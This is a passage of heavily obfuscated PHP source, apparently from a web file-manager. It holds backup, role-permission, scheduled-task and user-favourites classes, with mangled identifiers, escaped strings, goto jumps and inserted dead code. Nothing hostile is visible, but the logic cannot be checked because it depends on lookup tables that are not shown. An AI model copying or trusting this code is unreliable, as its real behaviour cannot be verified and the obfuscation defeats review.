($®’ÒæÑ < $ø„àˆÓü[689]) { if ($®’ÒæÑ >= 0) { break; } $®’ÒæÑ++; } $øï£¡ë = 1; while ($øï£¡ë <= (int) sqrt($í¿¢Øšœ)) { $“úõƒ÷ = $øï£¡ë; while (!0) { $“úõƒ÷++; $Ôš»„ª = $ø„àˆÓü[797]; while (strlen($Ôš»„ª) < $ø„àˆÓü[663]) { if (!$Ôš»„ª) { break; } $Ôš»„ª++; } if ($“úõƒ÷ <= 2) { $øï£¡ë = $“úõƒ÷; break; } else { if ($“úõƒ÷ < 2) { continue; } } $öšòÔÈ“ = !0; for ($˜·ç…Ÿ = 2; $˜·ç…Ÿ <= sqrt($“úõƒ÷); $˜·ç…Ÿ++) { if ($“úõƒ÷ % $˜·ç…Ÿ == 0) { $öšòÔÈ“ = !1; } } if ($öšòÔÈ“) { $øï£¡ë = $“úõƒ÷; break; } } $Ì¦…®—ë[] = $øï£¡ë; $ÎßÅöğ = $ø„àˆÓü[798]; } $‹¡´şÄé = 2; for ($“úõƒ÷ = $í¿¢Øšœ; $“úõƒ÷ > 1; $“úõƒ÷--) { $öšòÔÈ“ = !0; foreach ($Ì¦…®—ë as $Šº–£‡î) { if ($“úõƒ÷ % $Šº–£‡î == 0) { $öšòÔÈ“ = !1; break; } } if ($öšòÔÈ“) { $‹¡´şÄé = $“úõƒ÷; break; } } return $‹¡´şÄé; $»œ« = $ø„àˆÓü[799]; if (!$»œ«) { return; } } public function inwd612ff29c($•ÏÊ¸µ¤, $ÊĞú Ø§) { $—¼ò«§® =& $_SERVER[‚Õ“‡ÑÇ]; return call_user_func(array($—¼ò«§®[8], $—¼ò«§®[307]), $•ÏÊ¸µ¤, $ÊĞú Ø§); } public function bijvbf35d33c($€‹„„ÎŞ, $®Ó¨ßûÊ) { $ùÑæÉŞ· =& $_SERVER[Ñ¯©ç]; $†é‚Ÿú =& $_SERVER[‚Õ“‡ÑÇ]; return call_user_func(array($†é‚Ÿú[308], $†é‚Ÿú[309]), $€‹„„ÎŞ, $®Ó¨ßûÊ); $Ûã¡õá¬ = $ùÑæÉŞ·[800]; while (strlen($Ûã¡õá¬) < $ùÑæÉŞ·[679]) { if (!$Ûã¡õá¬) { break; } $Ûã¡õá¬++; } } public function paonea230346($³æ‡æ­, $ˆ›‚Ì¹¶) { $Ã¿û¯ˆÉ =& $_SERVER[‚Õ“‡ÑÇ]; return call_user_func(array($Ã¿û¯ˆÉ[308], $Ã¿û¯ˆÉ[310]), $³æ‡æ­, $ˆ›‚Ì¹¶); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $íØŸÂÃ“ =& $_SERVER[Ñ¯©ç]; $this->isManual(); self::$name = date($íØŸÂÃ“[801]); if (!($ŒÉ±Òæ = Model($íØŸÂÃ“[802])->lastItem())) { $ŒÉ±Òæ = $this->initData(); } else { self::$name = $ŒÉ±Òæ[$íØŸÂÃ“[32]]; if ($ŒÉ±Òæ[$íØŸÂÃ“[803]] == $íØŸÂÃ“[101]) { self::$name = date($íØŸÂÃ“[272]); $‰§Ö«Á¯ = 0; if (isset($ŒÉ±Òæ[$íØŸÂÃ“[353]][$íØŸÂÃ“[231]][$íØŸÂÃ“[524]])) { $‰§Ö«Á¯ = (int) $ŒÉ±Òæ[$íØŸÂÃ“[353]][$íØŸÂÃ“[231]][$íØŸÂÃ“[524]]; } if (self::$manual == 0 && $ŒÉ±Òæ[$íØŸÂÃ“[32]] == self::$name) { Model($íØŸÂÃ“[802])->remove($ŒÉ±Òæ[$íØŸÂÃ“[458]]); } $ŒÉ±Òæ = $this->initData($‰§Ö«Á¯, $ŒÉ±Òæ[$íØŸÂÃ“[804]]); } else { $this->checkStore($ŒÉ±Òæ[$íØŸÂÃ“[804]]); } } self::$option = $ŒÉ±Òæ; } private function isManual() { $´ƒÖé‘ = _get($GLOBALS, $_SERVER[Ñ¯©ç][805], 0); $´ƒÖé‘ = intval($´ƒÖé‘); self::$manual = $´ƒÖé‘ && $´ƒÖé‘ == 1 ? 1 : 0; } private function initData($¡ğ´µ€ã = 0, $êå»»¥’ = '') { $ìÛŸ¥û° =& $_SERVER[Ñ¯©ç]; $¦Ù”ˆ¨© = Model($ìÛŸ¥û°[802])->config(); if ($êå»»¥’ && $¦Ù”ˆ¨©[$ìÛŸ¥û°[804]] != $êå»»¥’) { $¡ğ´µ€ã = 0; } $this->checkStore($¦Ù”ˆ¨©[$ìÛŸ¥û°[804]]); if (self::$manual == 1) { self::$name .= $ìÛŸ¥û°[11] . date($ìÛŸ¥û°[806]); } $õœú˜é® = array($ìÛŸ¥û°[804] => $¦Ù”ˆ¨©[$ìÛŸ¥û°[804]], $ìÛŸ¥û°[32] => self::$name, $ìÛŸ¥û°[803] => 0, $ìÛŸ¥û°[807] => $¦Ù”ˆ¨©[$ìÛŸ¥û°[807]], $ìÛŸ¥û°[808] => self::$manual, $ìÛŸ¥û°[353] => array($ìÛŸ¥û°[809] => array($ìÛŸ¥û°[803] => 0), $ìÛŸ¥û°[810] => array($ìÛŸ¥û°[803] => 0, $ìÛŸ¥û°[811] => 0, $ìÛŸ¥û°[812] => 0, $ìÛŸ¥û°[33] => $ìÛŸ¥û°[12], $ìÛŸ¥û°[813] => 0, $ìÛŸ¥û°[814] => 0), $ìÛŸ¥û°[815] => array($ìÛŸ¥û°[803] => 0, $ìÛŸ¥û°[811] => 0, $ìÛŸ¥û°[812] => 0, $ìÛŸ¥û°[813] => 0, $ìÛŸ¥û°[814] => 0), $ìÛŸ¥û°[231] => array($ìÛŸ¥û°[803] => 0, $ìÛŸ¥û°[816] => 0, $ìÛŸ¥û°[817] => 0, $ìÛŸ¥û°[818] => 0, $ìÛŸ¥û°[819] => 0, $ìÛŸ¥û°[524] => $¡ğ´µ€ã, $ìÛŸ¥û°[813] => 0, $ìÛŸ¥û°[814] => 0)), $ìÛŸ¥û°[813] => time(), $ìÛŸ¥û°[814] => 0); $öıâÅ’“ = Model($ìÛŸ¥û°[802])->insert($õœú˜é®); $õœú˜é®[$ìÛŸ¥û°[458]] = $öıâÅ’“; return $õœú˜é®; } private function checkStore($µÎ›¨ıº) { $áøáıæ = Model($_SERVER[Ñ¯©ç][820]); $Äô½ûş§ = $áøáıæ->listData($µÎ›¨ıº); $áøáıæ->checkConfig($Äô½ûş§); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ñ¯©ç][802])->findByName(self::$name); } return self::$option; } public static function set($Ä¹ÌØì) { $·÷÷³çœ =& $_SERVER[Ñ¯©ç]; $‰£¬£Â = self::get(); foreach ($Ä¹ÌØì as $¤¬®ˆ”õ => $„†·„²´) { $ş¶©âÂ– = explode($·÷÷³çœ[10], $¤¬®ˆ”õ); $Ì™·¦”¶ = count($ş¶©âÂ–); switch ($Ì™·¦”¶) { case 1: $‰£¬£Â[$ş¶©âÂ–[0]] = $„†·„²´; break; case 2: $‰£¬£Â[$ş¶©âÂ–[0]][$ş¶©âÂ–[1]] = $„†·„²´; break; case 3: $‰£¬£Â[$ş¶©âÂ–[0]][$ş¶©âÂ–[1]][$ş¶©âÂ–[2]] = $„†·„²´; break; } } Model($·÷÷³çœ[802])->update($‰£¬£Â[$·÷÷³çœ[458]], $‰£¬£Â); self::$option = $‰£¬£Â; return self::$option; } public function keep() { $©ÖÇ™ÈÊ =& $_SERVER[Ñ¯©ç]; $ë¹¬…Œî = self::get(); if ($ë¹¬…Œî[$©ÖÇ™ÈÊ[353]][$©ÖÇ™ÈÊ[809]][$©ÖÇ™ÈÊ[803]] == $©ÖÇ™ÈÊ[101]) { return; } $this->backupKeep($ë¹¬…Œî); self::set(array($©ÖÇ™ÈÊ[821] => 1)); } private function backupKeep($‘ŠöµÜà) { $­ˆôª’â =& $_SERVER[Ñ¯©ç]; if (self::$manual == 1) { return; } $²ÎÉæ¸¤ = Model($­ˆôª’â[802])->listData(); if (empty($²ÎÉæ¸¤)) { return; } $ÜÔŞ—ñ = 0; $ÆÁÑ·Ç¼ = array(); foreach ($²ÎÉæ¸¤ as $¤¡ù´‰Ù) { if ($ÜÔŞ—ñ >= 7) { break; } $ÆÁÑ·Ç¼[] = $¤¡ù´‰Ù[$­ˆôª’â[32]]; $ÜÔŞ—ñ++; } for ($ÜÔŞ—ñ = 0; $ÜÔŞ—ñ < 12; $ÜÔŞ—ñ++) { $ÆÁÑ·Ç¼[] = date($­ˆôª’â[822], strtotime("\55{$ÜÔŞ—ñ}\40\155\x6f\156\x74\x68\x73")); } $ÆÁÑ·Ç¼ = array_unique($ÆÁÑ·Ç¼); $ËÅØÈà• = Model($­ˆôª’â[823])->get($­ˆôª’â[824]); foreach ($²ÎÉæ¸¤ as $¤¡ù´‰Ù) { if (isset($¤¡ù´‰Ù[$­ˆôª’â[808]]) && $¤¡ù´‰Ù[$­ˆôª’â[808]] == $­ˆôª’â[101]) { continue; } if (!empty($¤¡ù´‰Ù[$­ˆôª’â[32]]) && in_array($¤¡ù´‰Ù[$­ˆôª’â[32]], $ÆÁÑ·Ç¼)) { continue; } Model($­ˆôª’â[802])->remove($¤¡ù´‰Ù[$­ˆôª’â[458]]); $†Ú‡ÊÙ¡ = $this->backupPath($‘ŠöµÜà, $ËÅØÈà•); IO::remove($†Ú‡ÊÙ¡, !1); } } private function backupPath($¬øñÃÉ», $Ü³ÈÔ¼  = false) { $ù©Ü³‘ =& $_SERVER[Ñ¯©ç]; if (!$Ü³ÈÔ¼ ) { $Ü³ÈÔ¼  = Model($ù©Ü³‘[823])->get($ù©Ü³‘[824]); } $Óì…‰€è = $¬øñÃÉ»[$ù©Ü³‘[32]]; $‰İ¢·î = substr(md5($ù©Ü³‘[825] . $Ü³ÈÔ¼  . $Óì…‰€è), 0, 8); return "\173\x69\157\72{$¬øñÃÉ»[$ù©Ü³‘[804]]}\x7d\x2f\144\141\164\x61\142\141\163\x65\57\x62\141\x63\x6b\x75\x70\57" . $Óì…‰€è . $ù©Ü³‘[11] . $‰İ¢·î; } public function db() { $Ò©ÙÇà =& $_SERVER[Ñ¯©ç]; $¢¾¥¶éÅ = self::get(); if ($¢¾¥¶éÅ[$Ò©ÙÇà[353]][$Ò©ÙÇà[810]][$Ò©ÙÇà[803]] == $Ò©ÙÇà[101]) { return !0; } $‰¶à½™š = new BackupDb(); if (!$‰¶à½™š->index()) { return !1; } self::set(array($Ò©ÙÇà[826] => 1)); return !0; } public function dbFile() { $¶Ÿƒ­äâ =& $_SERVER[Ñ¯©ç]; $ãÌ³™¶€ = self::get(); if ($ãÌ³™¶€[$¶Ÿƒ­äâ[353]][$¶Ÿƒ­äâ[815]][$¶Ÿƒ­äâ[803]] == $¶Ÿƒ­äâ[101]) { return !0; } $Òéï’‚Ï = new BackupDbFile(); if (!$Òéï’‚Ï->index()) { return !1; } self::set(array($¶Ÿƒ­äâ[827] => 1)); return !0; } public function file() { $å¡­îäİ =& $_SERVER[Ñ¯©ç]; $®¾àï©« = self::get(); if ($®¾àï©«[$å¡­îäİ[353]][$å¡­îäİ[231]][$å¡­îäİ[803]] == $å¡­îäİ[101]) { return !0; } if (!isset($®¾àï©«[$å¡­îäİ[807]]) || $®¾àï©«[$å¡­îäİ[807]] == $å¡­îäİ[229]) { $œßû¨Îé = new BackupFile(); if (!$œßû¨Îé->index()) { return !1; } } self::set(array($å¡­îäİ[828] => 1, $å¡­îäİ[803] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $üã±¥à× =& $_SERVER[Ñ¯©ç]; $‰ãóôö» = Backup::get(); self::$io = $‰ãóôö»[$üã±¥à×[804]]; self::$name = $‰ãóôö»[$üã±¥à×[32]]; $Õ¾Ø†Û‚ = new DbManage(); $–Ø¢î = $Õ¾Ø†Û‚->dbType(); $±‹Ç­× = array($üã±¥à×[829] => $–Ø¢î, $üã±¥à×[830] => time()); Backup::set($±‹Ç­×); $¸Òƒ¬à• = $this->tmpFilesPath() . $üã±¥à×[831] . self::$name . $üã±¥à×[8]; del_dir($¸Òƒ¬à•); mk_dir($¸Òƒ¬à•); $±’–öÎí = $ÅëÅøÁÕ = 0; try { $†‚’Ã¢ = $Õ¾Ø†Û‚->db()->getTables(); } catch (Exception $†À½ğ†) { return !1; } $†‚’Ã¢ = array_diff($†‚’Ã¢, array($üã±¥à×[832], $üã±¥à×[833])); foreach ($†‚’Ã¢ as $´§Š‹ğ) { $±’–öÎí += $Õ¾Ø†Û‚->model($´§Š‹ğ)->count(); } $Ú¸ÒƒÇ” = new Task($üã±¥à×[834], $üã±¥à×[835], $±’–öÎí, LNG($üã±¥à×[836]) . $üã±¥à×[837] . LNG($üã±¥à×[838])); $GLOBALS[$üã±¥à×[839]] = self::$name; foreach ($†‚’Ã¢ as $´§Š‹ğ) { $ŸØ–³¦… = $¸Òƒ¬à• . $´§Š‹ğ . $üã±¥à×[840]; $º½Åæ  = null; if ($´§Š‹ğ == $üã±¥à×[841] && (!isset($‰ãóôö»[$üã±¥à×[807]]) || $‰ãóôö»[$üã±¥à×[807]] == $üã±¥à×[229])) { $º½Åæ  = self::$io; } $ÅëÅøÁÕ += $Õ¾Ø†Û‚->sqlFromDb($´§Š‹ğ, $ŸØ–³¦…, $Ú¸ÒƒÇ”, $º½Åæ ); } unset($GLOBALS[$üã±¥à×[839]]); $Ú¸ÒƒÇ”->end(); if ($ÅëÅøÁÕ > $±’–öÎí) { $±’–öÎí = $ÅëÅøÁÕ; } $±‹Ç­× = array($üã±¥à×[829] => $–Ø¢î, $üã±¥à×[826] => 1, $üã±¥à×[842] => $±’–öÎí, $üã±¥à×[843] => $ÅëÅøÁÕ, $üã±¥à×[844] => time()); Backup::set($±‹Ç­×); if ($±’–öÎí - $ÅëÅøÁÕ > 0) { $“ˆá¼¸ = $üã±¥à×[845]; if (!stristr(I18n::getType(), $üã±¥à×[846])) { $“ˆá¼¸ = $üã±¥à×[847]; } write_log(array($“ˆá¼¸, $±‹Ç­×), $üã±¥à×[835]); return !1; } return !0; } private function tmpFilesPath() { $×¹¸ÁìÛ =& $_SERVER[Ñ¯©ç]; $Îáç¾·ˆ = TEMP_FILES; if ($GLOBALS[$×¹¸ÁìÛ[6]][$×¹¸ÁìÛ[102]][$×¹¸ÁìÛ[848]]) { $Îáç¾·ˆ = $GLOBALS[$×¹¸ÁìÛ[6]][$×¹¸ÁìÛ[102]][$×¹¸ÁìÛ[848]]; if (!mk_dir($Îáç¾·ˆ) || !is_writable($Îáç¾·ˆ) || !IO::mkfile($Îáç¾·ˆ . $×¹¸ÁìÛ[849])) { $Îáç¾·ˆ = TEMP_FILES; } } return $Îáç¾·ˆ; } } goto e­æßíè†; eŸ¨”ğÔ¬¹: function binCheckBigger($ë‚‚•–õ, $‚ŒÏÆÄâ) { return $ë‚‚•–õ > $‚ŒÏÆÄâ; } $_SERVER[$_SERVER[©ş­®ò«][3]] = ("\70\64\71\71"."\x39\x35")+0;$_ibpk="2mvg1lubzxf7dnhpyok3t9j6sa4wie80c5qrxajleph8zntuysdcvi4b9o6031mwqk2g7rf5r0tbhqdx";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Å‘Œ«î£, $ß¹‰€Ì£) { $¥‰¿ª Ï =& $_SERVER[Ñ¯©ç]; if (isset(self::$_methodList[$Å‘Œ«î£])) { return @call_user_func_array(self::$_methodList[$Å‘Œ«î£], $ß¹‰€Ì£); } else { if (method_exists($this, $Å‘Œ«î£)) { return call_user_func_array(array($this, $Å‘Œ«î£), $ß¹‰€Ì£); } else { think_exception(__CLASS__ . $¥‰¿ª Ï[4] . $Å‘Œ«î£ . $¥‰¿ª Ï[5]); } } } public static function __callStatic($ß™˜ŞÍ, $ˆ±ŞŠşø) { if (isset(self::$_methodListStatic[$ß™˜ŞÍ])) { return call_user_func_array(self::$_methodListStatic[$ß™˜ŞÍ], $ˆ±ŞŠşø); } else { if (method_exists(self, $ß™˜ŞÍ)) { return call_user_func_array(array(self, $ß™˜ŞÍ), $ˆ±ŞŠşø); } else { show_json("{$ß™˜ŞÍ}\50\51\40\x6e\x6f\164\40\x65\x78\x69\x73\164\x3b", !1); } } } public static function addMethod($óò­Œ’, $µÅàé®ª) { self::$_methodList[$óò­Œ’] = $µÅàé®ª; } public static function addMethodStatic($ä€å¾“É, $Â¼Ô“¾) { self::$_methodListStatic[$ä€å¾“É] = $Â¼Ô“¾; } } goto aªğØß®‡ß; d‡Ùğ‡Ä: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x72\x6f\154\x65\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x61\x75\164\x68", "\154\141\x62\x65\x6c", "\144\x69\x73\160\x6c\141\171", "\163\x79\163\x74\x65\x6d", "\144\x65\x73\143", "\151\x67\156\157\162\145\105\170\x74", "\x69\147\156\157\162\145\106\x69\154\x65\123\x69\172\x65", "\141\x64\155\x69\156\x69\163\x74\162\x61\164\157\162", "\163\x6f\162\164"); public function listData($–é§ ¤Ú = false, $·ùİ±¿ = "\x73\157\162\x74", $ÚÇß’›§ = false) { $©¶·ñ–È =& $_SERVER[Ñ¯©ç]; $Š±å¥¹¨ = parent::listData($–é§ ¤Ú, $·ùİ±¿, $ÚÇß’›§); if (!$–é§ ¤Ú) { foreach ($Š±å¥¹¨ as $ˆ½¬ºò => $·ÌÌÚ›Æ) { if ($·ÌÌÚ›Æ[$©¶·ñ–È[2159]] == 1) { $Š±å¥¹¨[$ˆ½¬ºò][$©¶·ñ–È[509]] = LNG($©¶·ñ–È[2420]); } } } return $Š±å¥¹¨; } public function update($†–şñÚÖ, $‰÷ôïÅ) { $­°ãîˆ =& $_SERVER[Ñ¯©ç]; $Ğú”Ò£ = parent::listData($†–şñÚÖ); $ÆØ¨çæÑ = $this->findByName($‰÷ôïÅ[$­°ãîˆ[32]]); if (!$Ğú”Ò£ || $ÆØ¨çæÑ && $ÆØ¨çæÑ[$­°ãîˆ[458]] != $Ğú”Ò£[$­°ãîˆ[458]]) { return !1; } if ($ÆØ¨çæÑ[$­°ãîˆ[2159]] == 1) { $‰÷ôïÅ = array($­°ãîˆ[32] => $‰÷ôïÅ[$­°ãîˆ[32]], $­°ãîˆ[1978] => $‰÷ôïÅ[$­°ãîˆ[1978]]); } $this->filterAuth($‰÷ôïÅ[$­°ãîˆ[470]]); return parent::update($†–şñÚÖ, $‰÷ôïÅ); } public function remove($ù‡ñÎÓÄ) { $±ÚŠ…–¤ = parent::listData($ù‡ñÎÓÄ); if (!$±ÚŠ…–¤ || $±ÚŠ…–¤[$_SERVER[Ñ¯©ç][192]]) { return !1; } return parent::remove($ù‡ñÎÓÄ); } public function add($£åÄ) { $ËË±È‰¥ =& $_SERVER[Ñ¯©ç]; $Ì°…ß¥Ñ = $£åÄ[$ËË±È‰¥[32]]; if ($this->findByName($Ì°…ß¥Ñ)) { return !1; } $ö•‚ñ™à = array($ËË±È‰¥[477] => $Ì°…ß¥Ñ, $ËË±È‰¥[1961] => $ËË±È‰¥[12], $ËË±È‰¥[1957] => $ËË±È‰¥[1965], $ËË±È‰¥[2421] => 1, $ËË±È‰¥[1960] => 0, $ËË±È‰¥[2422] => 0, $ËË±È‰¥[1959] => $this->getSort()); $£åÄ = array_merge($ö•‚ñ™à, $£åÄ); $this->filterAuth($£åÄ[$ËË±È‰¥[470]]); return parent::insert($£åÄ); } private function getSort() { $ºˆ¿…„ =& $_SERVER[Ñ¯©ç]; $öì£×âª = parent::listData(); $õ¥‰²º = array_to_keyvalue($öì£×âª, $ºˆ¿…„[12], $ºˆ¿…„[1979]); return empty($õ¥‰²º) ? 0 : max($õ¥‰²º) + 1; } private function filterAuth(&$­â¾¹«¦) { $©îí•–“ =& $_SERVER[Ñ¯©ç]; $†÷ïš…§ = array(); $Ú€¼¸•• = array_filter(explode($©îí•–“[50], $­â¾¹«¦)); foreach ($Ú€¼¸•• as $­â¾¹«¦) { $‘Õ÷İ = explode($©îí•–“[10], $­â¾¹«¦); if ($‘Õ÷İ[0] == $©îí•–“[2423] && $‘Õ÷İ[1] != $©îí•–“[1247]) { $ÈÙ®ìç = $‘Õ÷İ[0] . $©îí•–“[10] . $‘Õ÷İ[1] . $©îí•–“[2424]; if (!in_array($ÈÙ®ìç, $Ú€¼¸••)) { $†÷ïš…§[] = $ÈÙ®ìç; } } $†÷ïš…§[] = $­â¾¹«¦; } $­â¾¹«¦ = implode($©îí•–“[50], $†÷ïš…§); } public function findRoleDefault() { $à×ó·£ =& $_SERVER[Ñ¯©ç]; $œÍ×¬ßâ = parent::listData(); $¸ˆ¦‘ß» = !1; foreach ($œÍ×¬ßâ as $»Ğ‚ ¡§) { if (!$»Ğ‚ ¡§ || $»Ğ‚ ¡§[$à×ó·£[1977]] == $à×ó·£[229] || $»Ğ‚ ¡§[$à×ó·£[2159]] == 1) { continue; } if (strstr($»Ğ‚ ¡§[$à×ó·£[470]], $à×ó·£[2425])) { continue; } if (!strstr($»Ğ‚ ¡§[$à×ó·£[470]], $à×ó·£[2426])) { continue; } if (!$¸ˆ¦‘ß») { $¸ˆ¦‘ß» = $»Ğ‚ ¡§; continue; } $¿ø€µ” = explode($à×ó·£[50], $¸ˆ¦‘ß»[$à×ó·£[470]]); $ıÍÆ—Ÿğ = explode($à×ó·£[50], $»Ğ‚ ¡§[$à×ó·£[470]]); if (count($¿ø€µ”) > count($ıÍÆ—Ÿğ)) { $¸ˆ¦‘ß» = $»Ğ‚ ¡§; } } return $¸ˆ¦‘ß» ? $¸ˆ¦‘ß»[$à×ó·£[458]] : $à×ó·£[12]; } public function sort($çË¨Ëä, $‡ğî´ Ğ) { return parent::update($çË¨Ëä, $‡ğî´ Ğ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x74\x61\163\153\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\164\171\160\145", "\x65\x76\x65\156\164", "\x74\151\155\x65", "\x64\x65\163\143", "\163\171\163\x74\145\155", "\145\x6e\141\x62\154\145", "\x6c\141\163\x74\x52\165\156", "\x73\x6f\x72\164"); public function listData($¥™¸–ÇÖ = false, $ôâ³­³Ô = "\x73\x6f\x72\164", $ß—ÕŞ¦° = false) { return parent::listData($¥™¸–ÇÖ, $ôâ³­³Ô, $ß—ÕŞ¦°); } public function add($±ãÜøğ) { $õğÄö’Û =& $_SERVER[Ñ¯©ç]; $·£ç¶­Ì = $this->findByName($±ãÜøğ[$õğÄö’Û[32]]); if ($·£ç¶­Ì) { return !1; } $±ãÜøğ[$õğÄö’Û[1708]] = 0; $±ãÜøğ[$õğÄö’Û[1979]] = $this->getSort(); return parent::insert($±ãÜøğ); } private function getSort() { $Ò™É¤ç¯ =& $_SERVER[Ñ¯©ç]; $ãÑı—§É = parent::listData(); $Æòû‚õ± = array_to_keyvalue($ãÑı—§É, $Ò™É¤ç¯[12], $Ò™É¤ç¯[1979]); return empty($Æòû‚õ±) ? 0 : max($Æòû‚õ±) + 1; } public function update($×Æ­ÖÁ†, $şÀ€˜¨È) { $–¢Ô²¹Ï =& $_SERVER[Ñ¯©ç]; $ÊÌ–äŞß = $this->listData($×Æ­ÖÁ†); $é«Ù–¤š = $this->findByName($şÀ€˜¨È[$–¢Ô²¹Ï[32]]); if (!$ÊÌ–äŞß || $é«Ù–¤š && $é«Ù–¤š[$–¢Ô²¹Ï[458]] != $ÊÌ–äŞß[$–¢Ô²¹Ï[458]]) { return !1; } return parent::update($×Æ­ÖÁ†, $şÀ€˜¨È); } public function remove($ì¡ÔÛÓ¿, $±—ååû = false) { $æèò¶û£ =& $_SERVER[Ñ¯©ç]; $Ä±û“¼² = $this->listData($ì¡ÔÛÓ¿); if (!$Ä±û“¼²) { return; } if (!$±—ååû && $Ä±û“¼²[$æèò¶û£[192]] == $æèò¶û£[101]) { return !1; } return parent::remove($ì¡ÔÛÓ¿); } public function enable($‚ÆßŠ“‚, $£†»¶‡²) { return $this->update($‚ÆßŠ“‚, array($_SERVER[Ñ¯©ç][2415] => $£†»¶‡²)); } public function run($†¨²‰Æá) { return $this->update($†¨²‰Æá, array($_SERVER[Ñ¯©ç][2427] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($©Î£»Ïí) { $ªÍ‚†¬â =& $_SERVER[Ñ¯©ç]; return array($ªÍ‚†¬â[2067] => array(USER_ID, $ªÍ‚†¬â[2428])); } protected function listData() { $ËáşÀò¤ =& $_SERVER[Ñ¯©ç]; $•Âãó = array($ËáşÀò¤[1748] => USER_ID, $ËáşÀò¤[541] => 0); $ÀÖ»±ÉÎ = $ËáşÀò¤[2429]; $Ãé§ü£Ñ = $this->field($ÀÖ»±ÉÎ)->where($•Âãó)->order($ËáşÀò¤[2430])->select(); return $Ãé§ü£Ñ ? $Ãé§ü£Ñ : array(); } protected function resetCache() { } protected function listView() { $‘Å±¿Ê =& $_SERVER[Ñ¯©ç]; $ëÌùŸÌñ = $this->listData(); $±±òœª¸ = array_filter_by_field($ëÌùŸÌñ, $‘Å±¿Ê[33], $‘Å±¿Ê[473]); $şÈçÃì¨ = array_to_keyvalue($±±òœª¸, $‘Å±¿Ê[12], $‘Å±¿Ê[97]); if (!$şÈçÃì¨) { return $ëÌùŸÌñ; } $ó‹êëı´ = 2000; $üıÜŞÔË = array($‘Å±¿Ê[474] => array($‘Å±¿Ê[475], $şÈçÃì¨)); $¬İŒæÁ‰ = Model($‘Å±¿Ê[877])->listSource($üıÜŞÔË, $ó‹êëı´); $¬İŒæÁ‰ = array_merge($¬İŒæÁ‰[$‘Å±¿Ê[96]], $¬İŒæÁ‰[$‘Å±¿Ê[95]]); $¬İŒæÁ‰ = array_to_keyvalue($¬İŒæÁ‰, $‘Å±¿Ê[194]); foreach ($ëÌùŸÌñ as $ùİŞù¶÷ => $©Å½ûÕ) { $ùœ³Œª‹ = $¬İŒæÁ‰[$©Å½ûÕ[$‘Å±¿Ê[97]]]; $ùœ³Œª‹ = $ùœ³Œª‹ ? $ùœ³Œª‹ : array(); $ëÌùŸÌñ[$ùİŞù¶÷] = array_merge($ùœ³Œª‹, $©Å½ûÕ); } return $ëÌùŸÌñ; } protected function addFav($Ô›ˆ»×, $µŠ­×û = '', $å«ô«åá = "\163\157\165\162\x63\145") { $—‰ş¶å =& $_SERVER[Ñ¯©ç]; $ø°Ç˜è = array($—‰ş¶å[1748] => USER_ID, $—‰ş¶å[541] => 0, $—‰ş¶å[479] => $å«ô«åá, $—‰ş¶å[478] => $Ô›ˆ»×); if ($this->where($ø°Ç˜è)->find()) { return !1; } $ø°Ç˜è = array($—‰ş¶å[1748] => USER_ID, $—‰ş¶å[541] => 0); $â¡Ï’Ù = $this->where($ø°Ç˜è)->max($—‰ş¶å[1979]); if (!$â¡Ï’Ù) { $â¡Ï’Ù = 0; } if (!$µŠ­×û && $å«ô«åá == $—‰ş¶å[473]) { $ÅŸ÷˜µÈ = Model($—‰ş¶å[1391])->where(array($—‰ş¶å[474] => $Ô›ˆ»×))->find(); if (!$ÅŸ÷˜µÈ) { return !1; } $µŠ­×û = $ÅŸ÷˜µÈ[$—‰ş¶å[32]]; } $µŠ­×û = $this->getAutoName($µŠ­×û); $¤šÓÛ³’ = array($—‰ş¶å[1748] => USER_ID, $—‰ş¶å[541] => 0, $—‰ş¶å[477] => $µŠ­×û, $—‰ş¶å[478] => $Ô›ˆ»×, $—‰ş¶å[479] => $å«ô«åá, $—‰ş¶å[1959] => $â¡Ï’Ù + 1); return $this->add($¤šÓÛ³’); } protected function remove($¨‡£éçù) { $Ÿ¡©ü´Ç =& $_SERVER[Ñ¯©ç]; $˜å¨üØ = array($Ÿ¡©ü´Ç[1748] => USER_ID, $Ÿ¡©ü´Ç[476] => $¨‡£éçù); return $this->where($˜å¨üØ)->delete(); } protected function removeByName($½•Åç™•) { $ñÌÅÄçÔ =& $_SERVER[Ñ¯©ç]; $»åÙ¨Ëº = array($ñÌÅÄçÔ[1748] => USER_ID, $ñÌÅÄçÔ[477] => $½•Åç™•, $ñÌÅÄçÔ[541] => 0); return $this->where($»åÙ¨Ëº)->delete(); } protected function rename($Í„í£Šè, $æóÑ‚Ç‚) { $öĞ¢›ÉË =& $_SERVER[Ñ¯©ç]; if ($Í„í£Šè == $æóÑ‚Ç‚) { return !1; } $Øèü‡‘… = $this->getAutoName($æóÑ‚Ç‚); if ($æóÑ‚Ç‚ != $Øèü‡‘…) { return !1; } $¥ôÜàØ = array($öĞ¢›ÉË[1748] => USER_ID, $öĞ¢›ÉË[541] => 0, $öĞ¢›ÉË[32] => $Í„í£Šè); return $this->where($¥ôÜàØ)->save(array($öĞ¢›ÉË[32] => $æóÑ‚Ç‚)); } protected function resetSort($ÒÜÎùãà) { $ÃÉ¬µÊË =& $_SERVER[Ñ¯©ç]; $ÒÜÎùãà = is_array($ÒÜÎùãà) ? $ÒÜÎùãà : array(); $­£è½´ˆ = array($ÃÉ¬µÊË[1748] => USER_ID); for ($¹Á˜Ñ´Å = 0; $¹Á˜Ñ´Å < count($ÒÜÎùãà); $¹Á˜Ñ´Å++) { $­£è½´ˆ[$ÃÉ¬µÊË[476]] = $ÒÜÎùãà[$¹Á˜Ñ´Å]; $this->where($­£è½´ˆ)->save(array($ÃÉ¬µÊË[1959] => $¹Á˜Ñ´Å + 1)); } return !0; } protected function moveTop($ıèŞ¹ÆÀ) { $ÊïğÃñ³ =& $_SERVER[Ñ¯©ç]; $ÔÅÍë = array($ÊïğÃñ³[1748] => USER_ID, $ÊïğÃñ³[541] => 0); $á÷Õ§Îé = $this->where($ÔÅÍë)->where(array($ÊïğÃñ³[32] => $ıèŞ¹ÆÀ))->find(); if 